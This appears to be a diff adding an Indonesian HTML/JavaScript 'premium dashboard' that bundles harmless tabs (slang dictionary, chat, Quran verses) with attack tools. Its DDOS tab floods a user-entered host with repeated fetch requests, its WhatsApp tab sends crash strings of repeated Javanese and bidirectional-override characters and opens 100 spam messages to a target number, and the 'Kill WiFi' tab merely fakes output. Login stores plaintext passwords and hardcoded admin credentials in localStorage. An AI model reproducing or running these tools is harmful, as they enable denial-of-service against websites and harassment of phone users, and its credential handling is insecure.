@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>PREMIUM SYSTEM - CREATE KEY MEMBER ONLY</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a1a2e);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+        }
+
+        /* LOGIN SCREEN */
+        .login-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0a0a0a;
+            z-index: 100000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .login-box {
+            background: rgba(0,0,0,0.9);
+            padding: 40px;
+            border-radius: 40px;
+            border: 2px solid cyan;
+            box-shadow: 0 0 50px cyan;
+            width: 90%;
+            max-width: 450px;
+        }
+
+        .video-circle {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 2px solid cyan;
+        }
+
+        .video-circle video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .login-box h1 {
+            color: cyan;
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 1.8rem;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 50px;
+            border: none;
+            background: #1e1e2e;
+            color: white;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 50px;
+            border: none;
+            background: cyan;
+            color: black;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .login-box button:hover {
+            background: #00b3b3;
+            transform: scale(1.02);
+        }
+
+        .btn-secondary {
+            background: #2c2c2c;
+            color: cyan;
+            border: 1px solid cyan;
+            margin-top: 10px;
+        }
+
+        .error-msg {
+            color: #ff4444;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .success-msg {
+            color: lime;
+            text-align: center;
+            margin-top: 15px;
+        }
+
+        .key-box {
+            background: #0a0a0a;
+            padding: 20px;
+            border-radius: 20px;
+            margin-top: 20px;
+            color: lime;
+            font-family: monospace;
+            text-align: center;
+            border: 1px solid #00ff00;
+            box-shadow: 0 0 10px rgba(0,255,0,0.3);
+        }
+
+        .key-line {
+            margin: 10px 0;
+            font-size: 14px;
+        }
+
+        .key-value {
+            color: #ffaa00;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
+        .divider {
+            text-align: center;
+            color: #aaa;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            position: absolute;
+            top: 50%;
+            width: 40%;
+            height: 1px;
+            background: #333;
+        }
+
+        .divider::before { left: 0; }
+        .divider::after { right: 0; }
+
+        /* DASHBOARD */
+        .dashboard {
+            display: none;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+
+        .header {
+            background: rgba(0,0,0,0.8);
+            padding: 20px;
+            border-radius: 30px;
+            text-align: center;
+            margin-bottom: 20px;
+            border: 1px solid cyan;
+            box-shadow: 0 0 20px rgba(0,255,255,0.3);
+        }
+
+        .header h1 {
+            color: cyan;
+            font-size: 2rem;
+        }
+
+        .user-info {
+            color: lime;
+            margin-top: 10px;
+        }
+
+        .tab-bar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .tab-btn {
+            background: #1e1e2e;
+            color: cyan;
+            border: 1px solid cyan;
+            padding: 12px 20px;
+            border-radius: 40px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.2s;
+        }
+
+        .tab-btn.active {
+            background: cyan;
+            color: black;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 25px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+        }
+
+        .card h3 {
+            color: cyan;
+            margin-bottom: 15px;
+            font-size: 1.5rem;
+        }
+
+        input, button, textarea {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border-radius: 40px;
+            border: none;
+            font-size: 14px;
+        }
+
+        input, textarea {
+            background: #1e1e2e;
+            color: white;
+            border: 1px solid #333;
+        }
+
+        textarea {
+            border-radius: 20px;
+            resize: vertical;
+        }
+
+        button {
+            background: cyan;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-danger {
+            background: #ff4444;
+            color: white;
+        }
+
+        .btn-warning {
+            background: #ffaa00;
+            color: black;
+        }
+
+        .btn-wort {
+            background: #8B5CF6;
+            color: white;
+        }
+
+        .output {
+            background: #0a0a0a;
+            padding: 15px;
+            border-radius: 20px;
+            margin-top: 15px;
+            color: lime;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .info-akun {
+            background: #0a2a1a;
+            padding: 15px;
+            border-radius: 20px;
+            margin-top: 10px;
+            text-align: left;
+            font-size: 14px;
+        }
+
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px;
+            border-bottom: 1px solid #333;
+        }
+
+        .info-label {
+            color: cyan;
+            font-weight: bold;
+        }
+
+        .info-value {
+            color: lime;
+        }
+
+        .chat-container {
+            background: #0a0a0a;
+            border-radius: 20px;
+            height: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .chat-messages {
+            flex: 1;
+            overflow-y: auto;
+            padding: 15px;
+            background: #0f0f1a;
+            border-radius: 20px 20px 0 0;
+        }
+
+        .chat-message {
+            margin-bottom: 12px;
+            padding: 10px;
+            border-radius: 15px;
+            word-break: break-word;
+        }
+
+        .chat-message.own {
+            background: #1a4a2a;
+            text-align: right;
+            margin-left: 20%;
+        }
+
+        .chat-message.other {
+            background: #2a2a4a;
+            text-align: left;
+            margin-right: 20%;
+        }
+
+        .chat-sender {
+            font-weight: bold;
+            color: cyan;
+            font-size: 12px;
+        }
+
+        .chat-text {
+            color: white;
+            margin-top: 5px;
+        }
+
+        .chat-time {
+            font-size: 10px;
+            color: #aaa;
+            margin-top: 5px;
+        }
+
+        .chat-input-area {
+            display: flex;
+            gap: 10px;
+            padding: 15px;
+            background: #1a1a2e;
+            border-radius: 0 0 20px 20px;
+        }
+
+        .chat-input-area input {
+            flex: 1;
+            margin: 0;
+            border-radius: 40px;
+        }
+
+        .chat-input-area button {
+            width: auto;
+            padding: 12px 25px;
+            margin: 0;
+        }
+
+        .online-count {
+            color: lime;
+            font-size: 12px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        .wort-container {
+            background: linear-gradient(135deg, #1a0a3a, #2a1a4a);
+            border-radius: 20px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .wort-title {
+            font-size: 2rem;
+            color: #8B5CF6;
+            text-shadow: 0 0 10px #8B5CF6;
+            margin-bottom: 15px;
+        }
+
+        .wort-display {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #aaffaa;
+            background: #0a0a0a;
+            padding: 20px;
+            border-radius: 20px;
+            margin: 15px 0;
+        }
+
+        .wort-input-group {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .wort-input-group input {
+            flex: 1;
+            margin: 0;
+        }
+
+        .wort-input-group button {
+            width: auto;
+            padding: 12px 25px;
+            margin: 0;
+        }
+
+        .wort-history-item {
+            background: #1e1e2e;
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .wort-word {
+            color: #8B5CF6;
+            font-weight: bold;
+        }
+
+        .logout-btn {
+            background: #555;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<!-- LOGIN SCREEN -->
+<div id="loginScreen" class="login-screen">
+    <div class="login-box">
+        <div class="video-circle">
+            <video autoplay loop muted playsinline>
+                <source src="https://files.catbox.moe/fqrrve.mp4" type="video/mp4">
+            </video>
+        </div>
+        <h1>🔐 LOGIN WITH KEY</h1>
+        
+        <input type="text" id="loginUser" placeholder="Username">
+        <input type="password" id="loginPass" placeholder="Password / Key">
+        <button id="submitLoginBtn">MASUK</button>
+        
+        <div class="divider">atau</div>
+        
+        <button id="showCreateKeyBtn" class="btn-secondary">🔑 CREATE NEW KEY (MEMBER)</button>
+        
+        <div id="createKeyPanel" style="display:none; margin-top:20px;">
+            <input type="text" id="newUsername" placeholder="Username baru">
+            <input type="password" id="newPassword" placeholder="Password (opsional)">
+            <button id="createKeyBtn" class="btn-secondary">✨ GENERATE KEY MEMBER</button>
+            <div id="generatedKey" class="key-box" style="display:none;"></div>
+        </div>
+        
+        <div id="loginError" class="error-msg"></div>
+        <div id="loginSuccess" class="success-msg"></div>
+    </div>
+</div>
+
+<!-- DASHBOARD -->
+<div id="dashboard" class="dashboard">
+    <div class="header">
+        <h1>🔥 PREMIUM DASHBOARD 🔥</h1>
+        <div class="user-info" id="userDisplay"></div>
+    </div>
+
+    <div class="tab-bar">
+        <button class="tab-btn" data-tab="infoakun">📋 INFO AKUN</button>
+        <button class="tab-btn" data-tab="chatglobal">💬 CHAT GLOBAL</button>
+        <button class="tab-btn active" data-tab="wort">🔮 WORT</button>
+        <button class="tab-btn" data-tab="bugwa">🐞 BUG WA</button>
+        <button class="tab-btn" data-tab="ddos">💣 DDOS</button>
+        <button class="tab-btn" data-tab="wifi">📡 KILL WiFi</button>
+        <button class="tab-btn" data-tab="download">📥 DOWNLOADER</button>
+        <button class="tab-btn" data-tab="quran">📖 QUR'AN</button>
+    </div>
+
+    <div id="tab-infoakun" class="tab-content">
+        <div class="card">
+            <h3>📋 INFO AKUN</h3>
+            <div class="info-akun" id="infoAkunContainer">
+                <div class="info-row"><span class="info-label">Username:</span><span class="info-value" id="infoUsername">-</span></div>
+                <div class="info-row"><span class="info-label">Role:</span><span class="info-value" id="infoRole">-</span></div>
+                <div class="info-row"><span class="info-label">Status:</span><span class="info-value" id="infoStatus">Active</span></div>
+                <div class="info-row"><span class="info-label">Expired:</span><span class="info-value" id="infoExpired">-</span></div>
+                <div class="info-row"><span class="info-label">Login Terakhir:</span><span class="info-value" id="infoLastLogin">-</span></div>
+                <div class="info-row"><span class="info-label">Total Tools:</span><span class="info-value" id="infoTools">8 Tools</span></div>
+            </div>
+            <button id="refreshInfoBtn" style="margin-top:15px;">🔄 REFRESH INFO</button>
+        </div>
+    </div>
+
+    <div id="tab-chatglobal" class="tab-content">
+        <div class="card">
+            <h3>💬 CHAT GLOBAL</h3>
+            <div class="chat-container">
+                <div class="online-count" id="onlineCount">👥 Online: 1 users</div>
+                <div class="chat-messages" id="chatMessages"></div>
+                <div class="chat-input-area">
+                    <input type="text" id="chatInput" placeholder="Ketik pesan global...">
+                    <button id="sendChatBtn" style="background:#25D366;">📤 KIRIM</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="tab-wort" class="tab-content active">
+        <div class="card">
+            <h3>🔮 WORT - KAMUS GAUL</h3>
+            <div class="wort-container">
+                <div class="wort-title">⚡ WORT ⚡</div>
+                <div class="wort-display" id="wortDisplay">Ketik kata di bawah</div>
+                <div class="wort-input-group">
+                    <input type="text" id="wortInput" placeholder="Cari arti kata gaul">
+                    <button id="cariWortBtn" class="btn-wort">🔍 CARI</button>
+                </div>
+                <div class="wort-input-group">
+                    <input type="text" id="tambahKataInput" placeholder="Tambah kata baru">
+                    <input type="text" id="tambahArtiInput" placeholder="Arti kata">
+                    <button id="tambahWortBtn" class="btn-wort">➕ TAMBAH</button>
+                </div>
+                <div id="wortHistoryList"></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="tab-bugwa" class="tab-content">
+        <div class="card">
+            <h3>🐞 WHATSAPP BUG TOOLS</h3>
+            <input type="text" id="bugTargetNumber" placeholder="Nomor Target (628xxxxxxx)">
+            <textarea id="bugMessage" rows="3" placeholder="Pesan bug"></textarea>
+            <button id="sendBugBtn" class="btn-danger">🚀 KIRIM BUG</button>
+            <button id="crashWaBtn" class="btn-danger">💥 CRASH WHATSAPP</button>
+            <button id="spamMsgBtn" class="btn-warning">📨 SPAM 100x</button>
+            <div id="bugOutput" class="output"></div>
+        </div>
+    </div>
+
+    <div id="tab-ddos" class="tab-content">
+        <div class="card">
+            <h3>💣 DDOS ATTACK</h3>
+            <input type="text" id="ddosTarget" placeholder="Target IP / Domain">
+            <input type="number" id="ddosThreads" placeholder="Threads" value="100">
+            <button id="ddosBtn" class="btn-danger">START DDOS</button>
+            <button id="stopDdosBtn" style="background:#555;">STOP</button>
+            <div id="ddosOutput" class="output"></div>
+        </div>
+    </div>
+
+    <div id="tab-wifi" class="tab-content">
+        <div class="card">
+            <h3>📡 KILL WiFi</h3>
+            <input type="text" id="wifiTarget" placeholder="Target IP / MAC">
+            <button id="killWifiBtn" class="btn-danger">KILL WiFi</button>
+            <div id="wifiOutput" class="output"></div>
+        </div>
+    </div>
+
+    <div id="tab-download" class="tab-content">
+        <div class="card">
+            <h3>📥 DOWNLOAD TIKTOK + IG TO CATBOX</h3>
+            <input type="text" id="videoUrl" placeholder="URL TikTok / Instagram">
+            <button id="downloadBtn">DOWNLOAD & UPLOAD</button>
+            <div id="downloadOutput" class="output"></div>
+        </div>
+    </div>
+
+    <div id="tab-quran" class="tab-content">
+        <div class="card">
+            <h3>📖 AYAT AL QUR'AN</h3>
+            <button id="randomAyatBtn">AYAT RANDOM</button>
+            <div id="ayatOutput" class="output"></div>
+        </div>
+    </div>
+
+    <button id="logoutMainBtn" class="logout-btn">🚪 LOGOUT</button>
+</div>
+
+<script>
+    // ============ DATA STORAGE ============
+    let users = JSON.parse(localStorage.getItem('finalUsers')) || [];
+    let keys = JSON.parse(localStorage.getItem('generatedKeys')) || [];
+    let globalChats = JSON.parse(localStorage.getItem('globalChats')) || [];
+    let activeUsers = JSON.parse(localStorage.getItem('activeUsers')) || [];
+    let wortDictionary = JSON.parse(localStorage.getItem('wortDictionary')) || [
+        { kata: "wibu", arti: "Penggemar budaya Jepang berlebihan" },
+        { kata: "mager", arti: "Malas gerak" },
+        { kata: "baper", arti: "Bawa perasaan" },
+        { kata: "gabut", arti: "Tidak ada kegiatan" },
+        { kata: "santuy", arti: "Santai dan tenang" }
+    ];
+
+    let currentUser = null;
+    let ddosInterval = null;
+
+    // ============ INIT DEFAULT USERS ============
+    if(users.length === 0) {
+        users.push({ username: 'admin', password: 'admin123', role: 'ADMIN', expired: 'Lifetime', lastLogin: null });
+        users.push({ username: 'member', password: 'member123', role: 'MEMBER', expired: 'Lifetime', lastLogin: null });
+        localStorage.setItem('finalUsers', JSON.stringify(users));
+    }
+
+    // ============ FUNCTIONS ============
+    function generateRandomKey(length = 20) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for(let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    function getExpiredDate() {
+        return '2026-12-31';
+    }
+
+    function saveKeys() { localStorage.setItem('generatedKeys', JSON.stringify(keys)); }
+    function saveUsers() { localStorage.setItem('finalUsers', JSON.stringify(users)); }
+    function saveActiveUsers() { localStorage.setItem('activeUsers', JSON.stringify(activeUsers)); }
+    function saveGlobalChats() { localStorage.setItem('globalChats', JSON.stringify(globalChats)); }
+    function saveWortDictionary() { localStorage.setItem('wortDictionary', JSON.stringify(wortDictionary)); }
+
+    function addActiveUser(username) {
+        if(!activeUsers.includes(username)) {
+            activeUsers.push(username);
+            saveActiveUsers();
+        }
+        updateOnlineCount();
+    }
+
+    function removeActiveUser(username) {
+        activeUsers = activeUsers.filter(u => u !== username);
+        saveActiveUsers();
+        updateOnlineCount();
+    }
+
+    function updateOnlineCount() {
+        const countElem = document.getElementById('onlineCount');
+        if(countElem) countElem.innerHTML = `👥 Online: ${activeUsers.length} users`;
+    }
+
+    function addChatMessage(username, message, isOwn = false) {
+        const chat = {
+            id: Date.now(),
+            username: username,
+            message: message,
+            time: new Date().toLocaleTimeString(),
+            isOwn: isOwn
+        };
+        globalChats.push(chat);
+        if(globalChats.length > 100) globalChats.shift();
+        saveGlobalChats();
+        renderChatMessages();
+    }
+
+    function renderChatMessages() {
+        const container = document.getElementById('chatMessages');
+        if(!container) return;
+        container.innerHTML = '';
+        globalChats.forEach(chat => {
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `chat-message ${chat.isOwn ? 'own' : 'other'}`;
+            msgDiv.innerHTML = `
+                <div class="chat-sender">${chat.isOwn ? '👤 ' + chat.username : '🌟 ' + chat.username}</div>
+                <div class="chat-text">${escapeHtml(chat.message)}</div>
+                <div class="chat-time">${chat.time}</div>
+            `;
+            container.appendChild(msgDiv);
+        });
+        container.scrollTop = container.scrollHeight;
+    }
+
+    function escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    function renderWortHistory() {
+        const container = document.getElementById('wortHistoryList');
+        if(!container) return;
+        container.innerHTML = '<div style="color:cyan; margin-bottom:10px;">📜 KAMUS WORT:</div>';
+        wortDictionary.slice(0, 10).forEach(w => {
+            const div = document.createElement('div');
+            div.className = 'wort-history-item';
+            div.innerHTML = `<div><span class="wort-word">${w.kata}</span> : ${w.arti}</div>`;
+            container.appendChild(div);
+        });
+    }
+
+    function updateInfoAkun() {
+        if(currentUser) {
+            document.getElementById('infoUsername').innerText = currentUser.username;
+            document.getElementById('infoRole').innerText = currentUser.role;
+            document.getElementById('infoStatus').innerHTML = '<span style="color:#0f0;">● Active</span>';
+            document.getElementById('infoExpired').innerText = currentUser.expired || 'Lifetime';
+            document.getElementById('infoLastLogin').innerText = currentUser.lastLogin || new Date().toLocaleString();
+        }
+    }
+
+    // ============ LOGIN LOGIC ============
+    document.getElementById('submitLoginBtn').onclick = () => {
+        const username = document.getElementById('loginUser').value.trim();
+        const password = document.getElementById('loginPass').value.trim();
+        
+        const foundUser = users.find(u => u.username === username && u.password === password);
+        if(foundUser) {
+            if(foundUser.expired !== 'Lifetime') {
+                const today = new Date().toISOString().split('T')[0];
+                if(foundUser.expired < today) {
+                    document.getElementById('loginError').innerHTML = '❌ Akun sudah expired!';
+                    return;
+                }
+            }
+            currentUser = foundUser;
+            currentUser.lastLogin = new Date().toLocaleString();
+            saveUsers();
+            localStorage.setItem('finalCurrentUser', JSON.stringify(currentUser));
+            document.getElementById('loginError').innerHTML = '';
+            document.getElementById('loginSuccess').innerHTML = '✅ Login berhasil!';
+            setTimeout(() => {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                document.getElementById('userDisplay').innerHTML = `👤 ${currentUser.username} (${currentUser.role})`;
+                updateInfoAkun();
+                renderChatMessages();
+                renderWortHistory();
+                addActiveUser(currentUser.username);
+                addChatMessage('SYSTEM', `${currentUser.username} bergabung ke chat global!`, false);
+            }, 1000);
+            return;
+        }
+        
+        const keyMatch = keys.find(k => k.username === username && k.key === password);
+        if(keyMatch) {
+            if(keyMatch.expired) {
+                const today = new Date().toISOString().split('T')[0];
+                if(keyMatch.expired < today) {
+                    document.getElementById('loginError').innerHTML = '❌ Key sudah expired!';
+                    return;
+                }
+            }
+            const newUser = {
+                username: keyMatch.username,
+                password: keyMatch.key,
+                role: 'MEMBER',
+                expired: keyMatch.expired || 'Lifetime',
+                lastLogin: new Date().toLocaleString()
+            };
+            users.push(newUser);
+            saveUsers();
+            currentUser = newUser;
+            localStorage.setItem('finalCurrentUser', JSON.stringify(currentUser));
+            keys = keys.filter(k => k.username !== username);
+            saveKeys();
+            document.getElementById('loginError').innerHTML = '';
+            document.getElementById('loginSuccess').innerHTML = '✅ Login dengan Key berhasil!';
+            setTimeout(() => {
+                document.getElementById('loginScreen').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                document.getElementById('userDisplay').innerHTML = `👤 ${currentUser.username} (${currentUser.role})`;
+                updateInfoAkun();
+                renderChatMessages();
+                renderWortHistory();
+                addActiveUser(currentUser.username);
+                addChatMessage('SYSTEM', `${currentUser.username} bergabung ke chat global!`, false);
+            }, 1000);
+            return;
+        }
+        
+        document.getElementById('loginError').innerHTML = '❌ Username atau password/key salah';
+    };
+
+    document.getElementById('showCreateKeyBtn').onclick = () => {
+        const panel = document.getElementById('createKeyPanel');
+        if(panel.style.display === 'none') {
+            panel.style.display = 'block';
+            document.getElementById('showCreateKeyBtn').innerHTML = '🔒 CLOSE';
+        } else {
+            panel.style.display = 'none';
+            document.getElementById('showCreateKeyBtn').innerHTML = '🔑 CREATE NEW KEY (MEMBER)';
+            document.getElementById('generatedKey').style.display = 'none';
+        }
+    };
+
+    document.getElementById('createKeyBtn').onclick = () => {
+        let username = document.getElementById('newUsername').value.trim();
+        const outputDiv = document.getElementById('generatedKey');
+        
+        if(!username) {
+            document.getElementById('loginError').innerHTML = '❌ Username harus diisi!';
+            return;
+        }
+        
+        if(users.find(u => u.username === username)) {
+            document.getElementById('loginError').innerHTML = '❌ Username sudah terdaftar!';
+            return;
+        }
+        
+        const newKey = generateRandomKey(20);
+        const expiredDate = getExpiredDate();
+        
+        keys.push({ username, key: newKey, role: 'MEMBER', createdAt: new Date().toLocaleString(), expired: expiredDate });
+        saveKeys();
+        
+        outputDiv.innerHTML = `
+            <div style="font-size:18px; margin-bottom:15px;">✨ KEY BERHASIL DIBUAT! ✨</div>
+            <div class="key-line"><strong>User :</strong> <span class="key-value">${username}</span></div>
+            <div class="key-line"><strong>Pw :</strong> <span class="key-value">${newKey}</span></div>
+            <div class="key-line"><strong>Role :</strong> <span class="key-value">MEMBER</span></div>
+            <div class="key-line"><strong>Expired :</strong> <span class="key-value">${expiredDate}</span></div>
+            <div style="margin-top:15px; font-size:12px;">⚠️ Simpan informasi ini! Gunakan untuk login.</div>
+        `;
+        outputDiv.style.display = 'block';
+        document.getElementById('newUsername').value = '';
+        document.getElementById('loginError').innerHTML = '';
+        document.getElementById('loginSuccess').innerHTML = '✅ Key MEMBER berhasil dibuat!';
+        setTimeout(() => document.getElementById('loginSuccess').innerHTML = '', 3000);
+    };
+
+    // ============ DASHBOARD FEATURES ============
+    document.getElementById('refreshInfoBtn').onclick = () => { updateInfoAkun(); };
+    document.getElementById('sendChatBtn').onclick = () => {
+        const msg = document.getElementById('chatInput').value.trim();
+        if(!msg) return;
+        addChatMessage(currentUser.username, msg, true);
+        document.getElementById('chatInput').value = '';
+    };
+    document.getElementById('chatInput').onkeypress = (e) => { if(e.key === 'Enter') document.getElementById('sendChatBtn').click(); };
+
+    document.getElementById('cariWortBtn').onclick = () => {
+        const kata = document.getElementById('wortInput').value.trim().toLowerCase();
+        const display = document.getElementById('wortDisplay');
+        const found = wortDictionary.find(w => w.kata === kata);
+        if(found) display.innerHTML = `${found.kata} : ${found.arti}`;
+        else display.innerHTML = `"${kata}" tidak ditemukan`;
+    };
+    document.getElementById('tambahWortBtn').onclick = () => {
+        const kata = document.getElementById('tambahKataInput').value.trim().toLowerCase();
+        const arti = document.getElementById('tambahArtiInput').value.trim();
+        if(!kata || !arti) return;
+        if(!wortDictionary.find(w => w.kata === kata)) {
+            wortDictionary.push({ kata, arti });
+            saveWortDictionary();
+            renderWortHistory();
+            document.getElementById('wortDisplay').innerHTML = `"${kata}" ditambahkan!`;
+        }
+        document.getElementById('tambahKataInput').value = '';
+        document.getElementById('tambahArtiInput').value = '';
+    };
+
+    function stopDdos() { if(ddosInterval) { clearInterval(ddosInterval); ddosInterval = null; } }
+    document.getElementById('ddosBtn').onclick = () => {
+        const target = document.getElementById('ddosTarget').value.trim();
+        const threads = parseInt(document.getElementById('ddosThreads').value) || 100;
+        const output = document.getElementById('ddosOutput');
+        if(!target) { output.innerHTML = 'Masukkan target'; return; }
+        stopDdos();
+        output.innerHTML = `🔥 DDOS ${target} with ${threads} threads 🔥<br>`;
+        let counter = 0;
+        ddosInterval = setInterval(() => {
+            for(let i=0; i<threads; i++) { fetch(`http://${target}`, { mode: 'no-cors' }).catch(e=>{}); counter++; }
+            if(counter % 50 === 0) output.innerHTML += `💣 Packet ${counter}<br>`;
+        }, 30);
+    };
+    document.getElementById('stopDdosBtn').onclick = () => { stopDdos(); document.getElementById('ddosOutput').innerHTML += '🛑 STOPPED<br>'; };
+
+    document.getElementById('killWifiBtn').onclick = () => {
+        const target = document.getElementById('wifiTarget').value.trim();
+        const output = document.getElementById('wifiOutput');
+        if(!target) { output.innerHTML = 'Masukkan target'; return; }
+        output.innerHTML = `📡 Kill WiFi on ${target}<br>`;
+        for(let i=1; i<=10; i++) setTimeout(() => output.innerHTML += `🔌 Packet ${i} sent<br>`, i*100);
+        setTimeout(() => output.innerHTML += `✅ ${target} disconnected<br>`, 1200);
+    };
+
+    document.getElementById('downloadBtn').onclick = () => {
+        const url = document.getElementById('videoUrl').value.trim();
+        const output = document.getElementById('downloadOutput');
+        if(!url) { output.innerHTML = 'Masukkan URL'; return; }
+        output.innerHTML = `📥 Processing ${url}<br>`;
+        if(url.includes('tiktok.com')) output.innerHTML += `🎵 TikTok detected<br>🔗 https://snaptik.app/${encodeURIComponent(url)}<br>✅ Catbox ready<br>`;
+        else if(url.includes('instagram.com')) output.innerHTML += `📸 Instagram detected<br>🔗 https://saveinsta.app/${encodeURIComponent(url)}<br>✅ Catbox ready<br>`;
+        else output.innerHTML += `⚠️ Gunakan snaptik.app atau saveinsta.app<br>`;
+    };
+
+    const ayatList = [
+        { surat: "Al-Fatihah 1:1", arab: "بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ", arti: "Dengan nama Allah Yang Maha Pengasih Maha Penyayang" },
+        { surat: "Al-Ikhlas 112:1-4", arab: "قُلْ هُوَ اللَّهُ أَحَدٌ", arti: "Katakanlah Dialah Allah Yang Maha Esa" }
+    ];
+    document.getElementById('randomAyatBtn').onclick = () => {
+        const random = ayatList[Math.floor(Math.random()*ayatList.length)];
+        document.getElementById('ayatOutput').innerHTML = `${random.surat}<br><div style="font-size:1.2rem;">${random.arab}</div><div>✨ ${random.arti}</div>`;
+    };
+
+    const karakterBug = 'ꦾ'.repeat(1000);
+    document.getElementById('sendBugBtn').onclick = () => {
+        let nomor = document.getElementById('bugTargetNumber').value.trim();
+        const pesan = document.getElementById('bugMessage').value.trim() || karakterBug;
+        const output = document.getElementById('bugOutput');
+        if(!nomor) { output.innerHTML = '❌ Masukkan nomor'; return; }
+        if(nomor.startsWith('0')) nomor = '62' + nomor.substring(1);
+        if(nomor.startsWith('+')) nomor = nomor.substring(1);
+        const waLink = `https://wa.me/${nomor}?text=${encodeURIComponent(pesan)}`;
+        output.innerHTML = `🐞 Sending to ${nomor}<br>🔗 <a href="${waLink}" target="_blank">Klik kirim</a><br>`;
+        window.open(waLink, '_blank');
+    };
+    document.getElementById('crashWaBtn').onclick = () => {
+        let nomor = document.getElementById('bugTargetNumber').value.trim();
+        if(nomor.startsWith('0')) nomor = '62' + nomor.substring(1);
+        const crashLink = `https://wa.me/${nomor}?text=${encodeURIComponent('‮⁦' + '0'.repeat(2000) + '⁩‮')}`;
+        window.open(crashLink, '_blank');
+    };
+    document.getElementById('spamMsgBtn').onclick = () => {
+        let nomor = document.getElementById('bugTargetNumber').value.trim();
+        if(nomor.startsWith('0')) nomor = '62' + nomor.substring(1);
+        for(let i=1; i<=100; i++) setTimeout(() => window.open(`https://wa.me/${nomor}?text=${encodeURIComponent(`SPAM ${i}/100`)}`, '_blank'), i*300);
+    };
+
+    document.getElementById('logoutMainBtn').onclick = () => {
+        if(currentUser) { addChatMessage('SYSTEM', `${currentUser.username} meninggalkan chat`, false); removeActiveUser(currentUser.username); }
+        currentUser = null;
+        localStorage.removeItem('finalCurrentUser');
+        document.getElementById('dashboard').style.display = 'none';
+        document.getElementById('loginScreen').style.display = 'flex';
+        document.getElementById('loginUser').value = '';
+        document.getElementById('loginPass').value = '';
+        stopDdos();
+    };
+
+    document.querySelectorAll('.tab-btn').forEach(btn => {
+        btn.onclick = () => {
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+            document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+            document.getElementById(`tab-${btn.dataset.tab}`).classList.add('active');
+            if(btn.dataset.tab === 'chatglobal') renderChatMessages();
+            if(btn.dataset.tab === 'wort') renderWortHistory();
+        };
+    });
+
+    setInterval(() => { if(currentUser && document.getElementById('tab-chatglobal').classList.contains('active')) renderChatMessages(); }, 3000);
+
+    const savedUser = localStorage.getItem('finalCurrentUser');
+    if(savedUser) {
+        currentUser = JSON.parse(savedUser);
+        addActiveUser(currentUser.username);
+        document.getElementById('loginScreen').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        document.getElementById('userDisplay').innerHTML = `👤 ${currentUser.username} (${currentUser.role})`;
+        updateInfoAkun();
+        renderChatMessages();
+        renderWortHistory();
+        addChatMessage('SYSTEM', `${currentUser.username} bergabung ke chat global!`, false);
+    }
+
+    window.onbeforeunload = () => { if(currentUser) removeActiveUser(currentUser.username); };
+</script>
+</body>
+</html>
